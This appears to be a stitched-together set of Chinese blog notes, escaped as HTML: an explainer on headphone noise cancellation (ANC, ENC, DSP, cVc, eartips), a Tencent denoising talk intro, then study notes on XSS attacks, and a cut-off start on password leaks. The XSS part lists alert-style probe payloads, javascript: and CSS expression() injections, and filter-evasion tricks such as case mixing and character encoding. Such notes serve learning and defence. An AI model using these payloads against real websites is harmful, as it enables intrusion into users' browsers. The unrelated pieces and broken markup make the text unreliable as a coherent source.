&lt;h2&gt;&lt;span id=&#34;降噪类型-两者分别举例对比讲解&#34;&gt; 降噪类型  (两者分别举例对比讲解)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://pic4.zhimg.com/80/v2-60c73c6d1120af56587797b587881ef3_720w.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;(1) 主动降噪 (Active Noice Control)&lt;br&gt;
・原理&lt;br&gt;
如果两个声音频率是一样的，振幅也是一样的，但是相位偏偏相反：两个声波处处相反，彼此抵消，声音就被消除了。&lt;br&gt;
想要产生用于抵消噪声的声波，首先要得到噪声的信息才可以。主动降噪耳机设有反馈麦克风用于采集环境中的噪声信号。这里有一个先后顺序的问题：先采集噪声，但是要与噪声同时产生抵消音才能够降噪。所以处理器会根据噪声进行预测，预测出下一时刻噪声的情况，并产生相应抵消声波。&lt;/p&gt;
&lt;p&gt;为了保证降噪质量，还需要一个反馈麦克风用来检测所合成后的噪声是否真的变小了。这时处理器会根据这个反馈麦克风测量到的结果，对处理过程进行调整从而进一步降低合成后的噪声音量，这叫做自适应过程。&lt;br&gt;
拾音器（监测环境噪音）→处理芯片（分析噪音曲线）→扬声器（产生反响声波）&lt;br&gt;
(2) 被动降噪&lt;br&gt;
被动式降噪耳机利用物理特性将外部噪声与耳朵隔绝开，通过不同材质的阻塞物来防止噪音进入耳朵，就像放鞭炮用手捂着耳朵一样。&lt;/p&gt;
&lt;p&gt;厂商需要精心研究耳塞的材质与形状、腔体的材质与形状等会影响被动降噪效果的各项因素，只要设计平衡就可以获得优秀的降噪效果。&lt;strong&gt;材质大多是塑胶材料&lt;/strong&gt;，但&lt;strong&gt;耳机腔体外观就各有不同&lt;/strong&gt;了，&lt;/p&gt;
&lt;p&gt;但除了须着重在隔音效果，&lt;strong&gt;穿戴舒适度更是耳机的根本&lt;/strong&gt;，因此在形状设计的&lt;strong&gt;人体工学也非常重要&lt;/strong&gt;。&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;耳塞差异&#34;&gt; &lt;strong&gt;耳塞差异&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.techteller.com/wp-content/uploads/2020/08/%E7%88%86%E6%AC%BE%E5%9C%969.jpg&#34;&gt;&lt;img src=&#34;https://www.techteller.com/wp-content/uploads/2020/08/%E7%88%86%E6%AC%BE%E5%9C%969.jpg&#34; alt=&#34;一次看懂抗噪耳机原理－2020年8款ANC主动降噪真无线蓝牙耳机推荐&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;耳塞部分不同于耳机材质与形状，是消费者可以自行选择与更换的。常见的有矽胶、海绵、二节 / 三节胶耳塞。海绵与二节 / 三节胶耳塞可以带来最好的被动隔音效果。&lt;/p&gt;
&lt;h4&gt;&lt;span id=&#34;海绵耳塞&#34;&gt; &lt;strong&gt;海绵耳塞&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.techteller.com/wp-content/uploads/2020/05/2017-VP-Medium__43784.1509029289.500.750-1.png&#34;&gt;&lt;img src=&#34;https://www.techteller.com/wp-content/uploads/2020/05/2017-VP-Medium__43784.1509029289.500.750-1.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;em&gt;image source：complyfoam&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了&lt;strong&gt;隔音效果拔群&lt;/strong&gt;以外，因为海绵可压缩，能让耳塞&lt;strong&gt;更贴合耳朵&lt;/strong&gt;借此带来优秀的舒适感。但海绵耳塞因材质特性&lt;strong&gt;会吸收音乐的高频部分与细节&lt;/strong&gt;，&lt;strong&gt;造成音质下滑&lt;/strong&gt;。且海绵耳塞&lt;strong&gt;易脏&lt;/strong&gt;，每隔一段时间就需要更换，相对其他耳塞属于消耗品。海绵厂商中比较知名的厂商是&lt;strong&gt; Comply&lt;/strong&gt;。&lt;/p&gt;
&lt;h4&gt;&lt;span id=&#34;矽胶耳塞&#34;&gt; &lt;strong&gt;矽胶耳塞&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.techteller.com/wp-content/uploads/2020/05/spinfit-tips_850x-1.png&#34;&gt;&lt;img src=&#34;https://www.techteller.com/wp-content/uploads/2020/05/spinfit-tips_850x-1.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;em&gt;image source： Spinfit&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;矽胶耳塞的隔音效果是最差的，当然这只是相比出来的结果，不代表矽胶耳塞的隔音都很差，只是更&lt;strong&gt;需注意耳塞尺寸避免漏音&lt;/strong&gt;。音质在高频与细节部分比海绵耳塞表现好，低频则是较海绵耳塞少。&lt;/p&gt;
&lt;p&gt;矽胶耳塞算是在&lt;strong&gt;音质&lt;/strong&gt;、&lt;strong&gt;舒适度&lt;/strong&gt;、&lt;strong&gt;隔音&lt;/strong&gt;、&lt;strong&gt;耐用度获得良好平衡&lt;/strong&gt;的材质，因此被耳机厂商广泛使用为标配耳塞。这几年矽胶耳塞最知名的是&lt;strong&gt; Spinfit&lt;/strong&gt;。&lt;/p&gt;
&lt;h4&gt;&lt;span id=&#34;二节-三节胶耳塞&#34;&gt; &lt;strong&gt;二节 / 三节胶耳塞&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.techteller.com/wp-content/uploads/2020/05/Earplug_14-694x462-2.jpg&#34;&gt;&lt;img src=&#34;https://www.techteller.com/wp-content/uploads/2020/05/Earplug_14-694x462-2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;em&gt;image source：unwire&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;二节 / 三节胶耳塞在&lt;strong&gt;隔音效果&lt;/strong&gt;与&lt;strong&gt;音质获得绝佳效果&lt;/strong&gt;，综合了海绵与矽胶耳塞的优点，&lt;strong&gt;全频表现都很好&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;但缺点也非常明显：「&lt;strong&gt;舒适度较差&lt;/strong&gt;」，这部分我认为算是影响蛮大的缺点，因为耳塞是会直接接触耳朵，而耳朵又是人体比较敏感的部位，如果戴起来不舒适在体感上很容易被放大。因此 Daniel 认为二 / 三节胶耳塞可以说是种&lt;strong&gt;优劣分明的耳塞&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;除了上列三种材质的耳塞也有&lt;strong&gt;复合材质耳塞&lt;/strong&gt;，像是矽胶与海绵同时使用的耳塞，为的就是想同时获得两种材质的优点。&lt;/p&gt;
&lt;p&gt;耳塞对耳机整体使用的体验影响甚大，在隔音方面其实只要&lt;strong&gt;选择适合自己的尺寸&lt;/strong&gt;加上&lt;strong&gt;正确的穿戴耳机&lt;/strong&gt;，以矽胶与海绵耳塞来说表现就是在 80 分与 95 分的差别而已，比较后依然听得出差异但都能应付日常生活使用。&lt;/p&gt;
&lt;p&gt;在音质方面则是比较能感受且使用上也确实有差异，海绵耳塞的音质理论上都会被影响，这也是矽胶耳塞非常明显的优势。&lt;/p&gt;
&lt;h4&gt;&lt;span id=&#34;spinfit-耳塞&#34;&gt; &lt;strong&gt;Spinfit 耳塞&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;矽胶耳塞随着技术演进，在隔音方面的表现也越来越优秀。像是 Daniel 平常使用的 Spinfit 矽胶耳塞，除了&lt;strong&gt;舒适&lt;/strong&gt;、&lt;strong&gt;听感表现佳&lt;/strong&gt;在&lt;strong&gt;隔音方面也非常棒&lt;/strong&gt;，耳机无须开大声就可以隔绝掉大多数外界声音。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;选择自己适合及调性的的耳塞&lt;/strong&gt;，&lt;strong&gt;是轻松且花费相对低的方法&lt;/strong&gt;。因此 Daniel 蛮推荐大家可以多试试几种耳塞，说不定能为你带来意想不到的新感觉。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;计算机领域技术&#34;&gt; 计算机领域技术&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;前馈降噪：接收外部噪音，计算出反相噪声在喇叭里播放，内外抵消。但耳道内还是会有一定残留&lt;/p&gt;
&lt;p&gt;反馈降噪：接收耳道内噪音，计算反相，直接抵消耳道内噪音，并且还能对耳机播放的声音进行反馈并动态调节。但直接反馈效果也不好。&lt;/p&gt;
&lt;p&gt;3、由喇叭发出带有噪音的反向声波的音乐（在播放音乐的同时对外部噪音进行中和处理）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://pic.hifidiy.net/www/2013/03/14/01_87.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;一、前馈式主动降噪设计：如图中所示，前馈式设计是将麦克风与耳机喇叭单元隔离开来（就是将麦克风的声音采集点设计在耳机腔体表面），确保喇叭产生的声波对麦克风的影响最小。这种设计为最直接的噪音采集方式，麦克风采集噪音信号之后，通过传递函数函数 G（w) 处理，通过喇叭发出反向声波，中和噪音。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://pic.hifidiy.net/www/2013/03/14/01_88.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;二、反馈式主动降噪设计：如图中所示，反馈式主动降噪将噪音采集麦克风设计在了喇叭附近，相对于前馈式，反馈式所采集到的噪音更接近于人耳所能听到的噪音，但是这种设计的一大缺点就是麦克风无法很好的分辨喇叭发出的声音及噪音的区别，如果音乐当中出现与噪音类似的声音，也会被识别为噪音，被进行处理，这在一定程度上造成了音乐的失真，如何避免这一现象，是体现各个厂商设计实力的所在。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://pic.hifidiy.net/www/2013/03/14/01_89.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;三、前馈与反馈结合式：如图中所示，这种方式就是集合以上两种降噪设计，拥有两个麦克风，这种设计除了会增加物料成本以外，对于函数 G（w）的建立也是一个不小的挑战，不过目前市面上已经有不少这类降噪耳机产品。&lt;/p&gt;
&lt;p&gt;总结：虽然笔者上面的介绍较为简洁，但降噪技术可真心没这么简单，想要做好一款真正实用的降噪耳机产品，对很多厂商来说是一件很头疼的问题，这也是为什么市面上你能见到的降噪耳机产品一般较贵的原因之一（销量小也是原因之一)。&lt;/p&gt;
&lt;p&gt;单前馈：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://5b0988e595225.cdn.sohucs.com/images/20180427/fbb9f0c8e15b44df9fab9ca11259888d.jpeg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;单反馈：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://5b0988e595225.cdn.sohucs.com/images/20180427/c0f9b504aa3a495991e00b3d9cca49b4.jpeg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们可以把&lt;strong&gt;前馈麦&lt;/strong&gt;形象地当作是一个干活差不多就行的凑合星人：比起质量，他更追求速度。听到某个噪声后，他只负责&lt;strong&gt;报告给 PCB&lt;/strong&gt;，然后&lt;strong&gt;就去接着监听别的声音了&lt;/strong&gt;；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反馈麦&lt;/strong&gt;则完全不同，是一位特别忠于职守、一丝不苟的严谨派。只要是他监听到的噪声，他就想要&lt;strong&gt;负责到底&lt;/strong&gt;，&lt;strong&gt;不处理干净声音就不罢休&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;那么，双麦一起降噪，又是什么样子呢？&lt;/p&gt;
&lt;p&gt;前馈 + 反馈：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://5b0988e595225.cdn.sohucs.com/images/20180427/327c77c307594018b461504a4aa56a12.jpeg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;看到这，相信你脑中也有了大致结论：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;前馈降噪频段宽、深度小；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;反馈降噪频段短、深度大；&lt;/p&gt;
&lt;p&gt;1.ANC 降噪（Active Noise Control，主动降噪），&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;工作原理是通过麦克风收集外部的环境噪音，然后经过系统变换为一个反相的声波加到喇叭端，最终人耳听到的声音是：环境噪音 + 反相的环境噪音，两种噪音叠加从而实现噪音降低。&lt;br&gt;
拾音器（监测环境噪音）→处理芯片（分析噪音曲线）→扬声器（产生反响声波）→完成降噪&lt;/p&gt;
&lt;p&gt;简单的说，假设出现的噪音为 A，通过外部的拾音器监测到后，那么耳机会瞬间产生 - A 的声音，两者在耳内相互抵消，以此实现降噪的功能。可以说其实你的耳朵已经 “听” 了噪音，但是同时也听到了 “降噪音”，两者在你耳中互相抵消实现降噪。&lt;/p&gt;
&lt;p&gt;主动降噪根据拾音麦克风位置的不同，分为前馈式主动降噪与反馈式主动降噪。&lt;/p&gt;
&lt;p&gt;这么一来，这个耳机需要一段的算法处理时间，先学习噪声，这个学习需要时间，然后再把学习到的噪声相位反转，有一个自适应调整期。&lt;/p&gt;
&lt;p&gt;主动降噪耳机价格昂贵，但是一般效果优秀，佩戴舒适。但是需要&lt;strong&gt;独立电池供电&lt;/strong&gt;，大多数被动降噪耳机可以不耗电使用（也不主动降噪）&lt;/p&gt;
&lt;p&gt;2.ENC 降噪 ENC（Environmental Noise Cancellation，环境降噪技术），通过双麦克风阵列，精准计算通话者说话的方位，在保护主方向目标语音的同时，去除环境中的各种干扰噪声。能有效抑制 90% 的反向环境噪声，由此降低环境噪声最高可达 35dB 以上。&lt;/p&gt;
&lt;p&gt;ENC 与 ANC 最明显的区别就在于，ANC 的受益人为使用耳机本人，通过 ANC 的功能，可以让用户自身免受环境噪音干扰；ENC 的受益人则是通话的另一方，通过 ENC 减少环境噪音对通话的影响，让对方听到纯净的语音。ANC 让自身听感环境更加安静，而 ENC 让通话的另一端听感环境更加安静。&lt;/p&gt;
&lt;p&gt;ENC 会使用&lt;strong&gt;双麦克风&lt;/strong&gt;，其中&lt;strong&gt;一个负责人声收音&lt;/strong&gt;，&lt;strong&gt;另一个负责接收环境声音&lt;/strong&gt;，并透过演算法将人声麦克风收到的声音与环境声音重叠的部分消除，这样就可以精准的将环境声音过滤。&lt;/p&gt;
&lt;p&gt;通过双麦克风阵列，精准计算通话者说话的方位，在保护主方向目标语音的同时，去除环境中的各种干扰噪声。&lt;/p&gt;
&lt;p&gt;ENC 全称是 Environmental Noise Cancellation（环境降噪技术）。ENC 包括单麦环境降噪和双麦环境降噪。单麦环境降噪通常以环境噪声为随机平稳加性噪声、且与语音信号不相关为前提估计噪声，然后进行滤波。因此，单麦环境降噪的效果比较差。双麦环境降噪则是通过双麦克风阵列，精准计算通话者说话的方位，在保护目标语音的同时，滤除环境中的各种干扰噪声。其工作原理大致如下：在进行环境噪声滤波模块计算之前，先校正语音麦克风和参考麦克风的增益，以及两个麦克风的时延。然后检测语音麦克风采集到的数据是否为语音段。若为语音段（即上行通话），则根据参考麦克风采集到的环境噪声和语音麦克风的语音数据，预估环境噪声，并计算相应的噪声抑制参数，最终由滤波器模块滤出环境噪声；反之，不进行环境噪声滤除，上行通话输出为静音。ENC 主要降低通话时非目标语音噪声，确保通话清晰。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.zowee.com.cn/upload/image/20200724/20200724152137_1134.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;3.DSP 降噪的原理和 ANC 降噪相似。但 DSP 降噪正反向噪音直接在系统内部相互中和抵消。DSP 与 ANC 的区别：（1）混叠的信号类型不同：ANC 混叠声信号，而 DSP 混叠数字电信号。（2）混叠的位置不同：ANC 是在喇叭到耳膜这段空气中，进行声信号的混叠，而 DSP 是在耳机系统内部进行电信号的混叠。&lt;/p&gt;
&lt;p&gt;4.CVC 降噪 CVC（Clear Voice Capture）是通话软件降噪技术。主要针对通话过程中产生的回声。通过全双工麦克风消噪软件，提供通话的回声和环境噪音消除功能，是目前蓝牙通话耳机中最先进的降噪技术。&lt;/p&gt;
&lt;p&gt;cVc 可以说是使用高通晶片蓝牙耳机的独家技术，与 ENC 的概念相同都是透过麦克风收音去辨识分离环境音与人声，算是通话降噪的指标，但偶有听说 CVC 的降噪效果过强造成人声也被消除的状况。&lt;/p&gt;
&lt;p&gt;尽管高通的 cVc 技术较知名，但&lt;strong&gt; ENC 与 cVc 并无优劣之分&lt;/strong&gt;，两者都可以为通话带来超过 30 分贝以上的降噪效果，ENC 只要厂商适当调整不会输给 cVc，基本上&lt;strong&gt;有通话降噪技术就可视为通话品质有一定的水准&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;DSP 技术主要受益方是耳机使用者本人，而 CVC（消除回声）主要使通话的另一方受益。&lt;/p&gt;
&lt;p&gt;这里我总结了一个思维导图给大家。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic1.zhimg.com/80/v2-cc1e9ffad4c0d9b4b557eb0684393ef0_720w.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果说 ANC 让自身听感环境更加安静，那 ENC 则是让通话的另一端听感环境更加安静。而 CVC 可以理解成一种算法或者软件，它主要针对通话过程中的回音，受益人为通话的另一端，ENC 则是针对环境噪声，虽然受益的也是通话的另一端，但是针对的干扰信号不同。DSP 降噪虽然跟 ANC 主动降噪原理类似，但是中和声波的位置是不一样的，这下搞明白了吗？&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;其他&#34;&gt; 其他&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;ANC 主动降噪因为发声器（喇叭）需要同时发出声音与抵销外界噪音的反向声波，因此&lt;strong&gt;音质部分势必会受到干扰&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;多数追求音质的人都会重视器材的「&lt;strong&gt;保真度&lt;/strong&gt;」，即声音细节是否能妥善还原，但开启 ANC 主动降噪模式后，喇叭发出的&lt;strong&gt;反向声波就可能造成声音的细节部分被掩盖流失&lt;/strong&gt;，这时就会造成耳机音质变差、听起来闷闷的情形。&lt;/p&gt;
&lt;p&gt;除了最常见的麦克风收音外，科技大厂 Huawei 华为在自家真无线蓝牙耳机 Freebuds 3 上使用了「&lt;strong&gt;骨声纹&lt;/strong&gt;」感应装置，技术类似骨传导耳机的发声方式只是变为收音，借此来强化人声收音，算是非常特别的技术。&lt;/p&gt;
&lt;p&gt;大家好，我是来自腾讯多媒体实验室的李松南，本次分享将为大家介绍传统降噪和深度学习降噪方法，以及降噪技术未来的发展趋势。腾讯多媒体实验室专注于多媒体技术领域的前沿技术探索、研发、应用和落地，在长期积累中精心打造出三大核心能力，分别是：音视频编解码、网络传输和实时通信；多媒体内容处理、分析、理解和质量评估；沉浸式媒体系统设计和端到端解决方案。本次分享中的内容就属于多媒体内容处理的一部分。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://segmentfault.com/img/remote/1460000021721653&#34; alt=&#34;图像视频降噪的现在与未来——从经典方法到深度学习&#34;&gt;&lt;/p&gt;
&lt;p&gt;上图是腾讯多媒体实验室常年积累起来的视频处理能力，包括视频降噪、去压缩失真、视频去抖动、夜景增强、视频超分、视频锐化等，这些能力已经应用于腾讯的许多产品，比如腾讯云、全民 K 歌、企鹅电竞、微视、QQ 空间等。目前团队正在向腾讯云推出画质修复功能，已经开发和计划开发的技术，包括视频超分、去伪影、去抖动、去划痕与雪花、插帧、HDR，还有下面主要介绍的视频降噪技术。&lt;/p&gt;
&lt;p&gt;图像、视频从采集到播放的整个生命周期中会经历各种各样的处理过程，比如采集、剪辑、编码、转码、传输、显示等，每个处理过程都会引入失真。“噪声” 就是在信号采集过程中引入的一种普遍失真。降低噪声强度可以使图像主观效果更好。另外，在图像、视频压缩时也不必浪费码率在编码噪声上。同时，会使得视频编码中的运动估计更准确、熵编码速度更快。&lt;/p&gt;

 &lt;ol&gt;
&lt;li&gt;
&lt;p&gt;XSS 是一种被恶意注入不好的代码，然后在用户的软件或者浏览器中运行，通常原因是由于浏览器或者软件过滤不足，或者浏览一些不友好的博客文章&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XSS 对服务器不具有毒害性，具有强烈的传播性，可以类似于病毒传播，借助于浏览器平台进行大肆传播&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XSS 普遍原因：&lt;br&gt;
web 浏览器安全技术&lt;br&gt;
安全意识&lt;br&gt;
软件开发人员并没有在安全方面深入学习&lt;br&gt;
攻击范围多且广，防不胜防&lt;br&gt;
 XSS 最初是一种弹出对话框使用户输入信息的一种攻击性不强的技术，但是它和其他技术一起使用，很容易使网站瘫痪，造成很大的损失&lt;/p&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;反射型 XSS&lt;br&gt;
 将不好的代码注入到 URL 的地址参数中，在用户访问网站时，可以弹出对话框，只有用户点击时才会触发攻击，并且不会残留，所以只要用户具有安全意识，还是可以避免的，但是，有时候侵略者会用一些编码转换解决&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;持久型 XSS&lt;br&gt;
 这种恶意代码的伤害更大，它将恶意代码存入漏洞服务器中，只要用户访问此网址，代码就会自动执行，往往存在于博客文章中，当一个大网站被攻击时，在里面注册的用户很大可能就会被攻击，导致大批量的工作瘫痪，并且这种 XSS 更能轻易的写出危害性更大的代码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发掘反射型的 XSS&lt;br&gt;
 在一些网页的搜索框内输入 XSS&lt;xss&gt;’ ‘’，按搜索，出现搜索内容，表示有反射型 XSS 漏洞，这是返回搜索框，在里面输入网页代码&lt;script&gt;(‘XSS’)&lt;script&gt;, 有漏洞的会弹出显示 XSS 的提示框，我们可以查看源代码，发现造成这个漏洞的原因是浏览器没有对一些特定的搜索符号如 ‘&amp;lt;‘  等进行过滤，使浏览器把这个搜索内容当作源代码中的一部分进行解析。&lt;br&gt;
其中，我们把输入代码，弹出 XSS 提示框的行为叫做黑盒技术，发现漏洞原因的这个行为叫做白盒技术&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发掘持久型 XSS&lt;br&gt;
 在留言框等网页上输入&lt;script&gt;alert(/XSS/)&lt;/script&gt;，之后登录后台可以发现浏览器将这句代码直接进行了翻译，并没有过滤有害字符，导致了一个持久型存在于留言位置的 XSS 漏洞&lt;br&gt;
其中我们把即利用白盒技术也利用黑盒技术的行为叫做灰盒技术&lt;br&gt;
同时需要注意的是有时候不能将代码翻译出来原因在于标签前后开闭，注意增补标签，使浏览器顺利翻译出来&lt;/xss&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XSS Cheat Sheet&lt;br&gt;
&lt;a href=&#34;http://ha.ckers.org/xss.html&#34;&gt;http://ha.ckers.org/xss.html&lt;/a&gt; 在这里面有很多测试用例可以方便用于 XSS 测试&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;进行以上两个简单的 XSS 测试时，发现几乎没有网站这么脆弱… 原因在于它们一般有一个好东西 ------XSS-Filter，中文名跨站脚本过滤器，实际上它就是一些用于过滤各种各样字符的一些函数，我们都知道，上有政策下有对策，所以尽管这段函数想的再精细，也防不胜防，总有一些空子可以钻，但是错误还是基本能防范的&lt;br&gt;
这个跨站脚本过滤器呢，有一个小特点，人们在设计它的时候，在里面加入了白名单和黑名单，白名单是可以完全信任的，当输入任何东西，可以不用过滤、消毒、筛选，就能直接发布，黑名单则不一样，要进行严格的过滤&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 &amp;lt; &amp;gt; 标记注射 Html /Javascript&lt;br&gt;
 攻：当用户浏览器没有过滤掉 &amp;lt;&amp;gt; 这些字符时，用户就可以利用 JS 或 Vbscript 进行一些代码编写，从而插入恶意脚本&lt;br&gt;
防：过滤掉 &amp;lt;&amp;gt; 或者&lt;script&gt;这些字符&lt;br&gt;
实践：很大一部分不可以&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 HTML 标签属性值执行 XSS&lt;br&gt;
 攻：这里首先先认识一下 javascript 伪协议，我简单的理解为在浏览器地址框中输入类似 javasript: 代码，冒号后面的代码会被 JS 的解释器运行，当然由于是伪代码的原因，也有部分浏览器是不支持的，支持的浏览器中也可以运用部分 HTML 标记的属性值进行 XSS&lt;br&gt;
 防：过滤 JavaScript 等关键字体   ，同时 Vbscript 的脚本也有可能被嵌入&lt;br&gt;
实践：360 可以   ，但是还是很容易暴露&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用空格回车 Tab&lt;br&gt;
 攻：在上一个方法中，浏览器只要过滤掉一些关键字符还是可以很轻松的防御漏洞，这时我们可以尝试一下在代码中加入空格回车或者 Tab，这时也许就不会被发现，浏览器往往为了迎合大众，尽可能的解析代码，所以往往一些语法规则不是很严格执行，造成了这些空子&lt;br&gt;
在这里，我们分析以下，这个代码可以执行的原因，在 JS 中，一个语句的完成是以分号为标准，所以只要我们的语句没有分号，浏览器就会一直翻译下去，直到遇见分号，当然如果我们同一行有两句代码，第一句的末尾就必须有分号&lt;br&gt;
实践：很容易暴露，基本无法实现&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对标签属性值转码&lt;br&gt;
攻：由于 html 支持 ASCII，所以可以将其中的部分敏感字符替换成 ASCII 码，同时，空格回车 Tab 键也可换成 ASSCII 码进行输入，还可以把、等字符插入到 JavaScript 或 Vbscript 的头部&lt;br&gt;
防：过滤关键字符&lt;br&gt;
实践：火狐直接不行，其他浏览器感觉也不能达到效果&lt;br&gt;
 14. 产生自己的事件。&lt;br&gt;
事件：&lt;br&gt;
攻： JavaScript 与 HTML 之间的交互是通过事件来实现的，举个栗子：&lt;br&gt;
&lt;input type=&#34;button&#34; value=&#34;click me&#34; onclick=&#34;alert(&#39;click me&#39;)&#34; /&gt;&lt;br&gt;
这是一个 HTML 代码中的事件处理程序，运行这段代码，当单击【click me】按钮后，会触发 onclick 事件，然后执行当中的 JavaScript&lt;br&gt;
 防：&lt;br&gt;
实践：基本浏览器都可以实现，火狐浏览器可以直接实现，但是 360 不会一开始就运行，会显示代码有风险，用户确认之后才能才能运行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 CSS 跨站剖析&lt;br&gt;
攻：顾名思义，就是在 CSS 中插入 JS 代码，然后运行，缺点就是有一部分浏览器不支持这种规则，就比较麻烦&lt;br&gt;
防：包含 expression、javascript、import 等敏感字符的样式表也要进行过滤。&lt;br&gt;
实践：基本都支持，并且正常运行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扰乱过滤规则&lt;br&gt;
攻：上面介绍的几种方法只要跨站脚本过滤器做的足够细致，那么也是基本可以规避的。那么换个思路，我们的方法都是要被这个函数过滤掉，那么不如想想办法，怎样可以逃过跨站脚本过滤器的火眼金睛，以下总结几个常用的小技巧&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;转换大小写&lt;/li&gt;
&lt;li&gt;大小写混淆&lt;/li&gt;
&lt;li&gt;不用双引号，而是使用单引号的&lt;/li&gt;
&lt;li&gt;不使用引号&lt;/li&gt;
&lt;li&gt;插入 / 字符  &amp;lt;img/src=&amp;quot;mars.png&amp;quot;alt=“mars”&amp;gt; &amp;lt;img/src=“javascript:alert (‘XSS’);”&amp;gt;&lt;/li&gt;
&lt;li&gt;当利用 expression 执行跨站代码时，可以构造不同的全角字符来扰乱&lt;br&gt;
过滤规则：&lt;XSS STYLE=&#34;xss:exprEssion(alert(&#39;XSS&#39;))&#34;&gt; &lt;div style=&#34;{ left:expression( alert(&#39;xss&#39;) ) }&#34;&gt;&lt;br&gt;
全角：两个字节，一个字符的位置 (中文字符、标点符号)&lt;br&gt;
 半角：一个字节，半个字符的位置 (西文字母、标点符号)&lt;/li&gt;
&lt;li&gt;样式表中的 // 会被浏览器忽略，因此可以运用 // 来注释字符&lt;/li&gt;
&lt;li&gt;样式标签中的 \ 和结束符 \0 也是被浏览器忽略的&lt;/li&gt;
&lt;li&gt;将 CSS 中的关键字进行转码处理，如将 e 转换成 \65，包括改变&lt;br&gt;
编码中 0 的数量&lt;br&gt;
当然，只要你能想到，就用这些方法进行各种叠加尝试，不过，最后是否能成功和浏览器对这些代码的渲染以及解释有关，这些差异和细节都可能引起各种不同 XSS，所以要深入的了解这些转换方法还得多积累&lt;/li&gt;
&lt;/ul&gt;
&lt;/script&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;

 &lt;h2&gt;&lt;span id=&#34;知识储备&#34;&gt; 知识储备&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;密码泄露原因：&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;本地泄露&lt;br&gt;
 1.1 恶意木马 / 恶意植入 / 键盘监听&lt;br&gt;
建议：&lt;br&gt;
不在公共或者潜在安全的设备上进行密码操作&lt;br&gt;
不安装未知来源的盗版软件&lt;br&gt;
 1.2 伪造&lt;br&gt;
有人开发一款和官方软件一模一样的 App，或者抢先占用 alipay:// 这个协议的 URL_Scheme&lt;br&gt;
 建议：&lt;br&gt;
